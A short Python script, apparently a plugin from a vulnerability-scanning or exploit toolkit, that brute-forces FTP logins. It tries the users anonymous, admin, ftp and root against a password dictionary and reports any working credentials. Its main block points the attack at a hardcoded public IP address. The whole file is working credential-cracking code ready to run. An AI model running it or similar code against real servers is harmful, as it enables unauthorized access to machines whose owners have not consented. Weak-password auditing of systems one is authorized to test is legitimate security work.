#-*-coding:utf-8-*-

import ftplib
from exp.lib.gla import getpassdict

def verify(protocol,ip,port):
    host = ip+':'+str(port)
    print('testing if ftp unauthorized access vul')
    user_list = ['anonymous','admin','ftp','root']
    passdictarr = getpassdict()
    psw = passdictarr.get_pass_dict()
    for user in user_list:
        for pass_ in psw:
            pass_ = str(pass_.replace('{user}', user))
            print("cracking ftp password with:  " + user + " and pass : " + pass_)
            try:
                ftp = ftplib.FTP()
                ftp.timeout = 8
                ftp.connect(ip,int(port))
                ftp.login(user, pass_)
                if pass_ == '': pass_ = "null"
                if user == 'ftp' and pass_ == 'ftp':
                    msg = 'There is anonymous ftp password on url: ' +host+ '.'
                    number = 'v17'
                    print(msg)
                    return True,host,number,msg
                else:
                    msg = 'There is a weak ftp password on url: ' +host+ ' and the username and password is: %s and %s' % (user,pass_)
                    number = 'v17'
                    print(msg)
                    return True,host,number,msg
            except Exception as e:
                pass
    msg = 'There is no weak ftp password on url: ' +host+' .'
    number = 'v0'
    return False,host,number,msg

if __name__ == '__main__':
    res = verify('http','183.237.147.108',21)
    print(res)